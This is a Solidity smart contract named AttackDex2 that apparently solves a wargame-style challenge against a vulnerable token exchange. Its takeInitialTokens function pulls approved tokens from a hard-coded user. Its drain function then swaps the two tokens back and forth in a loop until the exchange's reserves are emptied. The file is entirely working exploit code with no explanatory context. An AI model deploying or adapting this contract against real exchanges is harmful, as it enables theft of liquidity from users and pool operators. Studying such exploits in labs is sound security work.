pragma solidity ^0.8.0;

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IDex {
    function swap(address from, address to, uint256 amount) external;
}

contract AttackDex2 {
    address private token1 = 0xB7A5bd0345EF1Cc5E66bf61BdeC17D2461fBd968;
    address private token2 = 0xeEBe00Ac0756308ac4AaBfD76c05c4F3088B8883;
    address public user = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
    address private dexInstance = 0xa16E02E87b7454126E5E10d957A927A7F5B5d2be;

    constructor() {
    }

    function takeInitialTokens() public {
        // Since we are approved, we can transfer the tokens from user's account
        require(IERC20(token1).transferFrom(user, address(this), 1000000), "Token1 transfer failed");
        require(IERC20(token2).transferFrom(user, address(this), 1000000), "Token2 transfer failed");
    }

    function drain() external {
        uint256 balance1 = IERC20(token1).balanceOf(address(this));
        uint256 balance2 = IERC20(token2).balanceOf(address(this));

        while (IERC20(token1).balanceOf(dexInstance) != 0 || IERC20(token2).balanceOf(dexInstance) != 0) {
            if (balance1 > 0) {
                IDex(dexInstance).swap(token1, token2, balance1);
                balance2 = IERC20(token2).balanceOf(address(this));
            }
            if (balance2 > 0) {
                IDex(dexInstance).swap(token2, token1, balance2);
                balance1 = IERC20(token1).balanceOf(address(this));
            }
        }
    }
}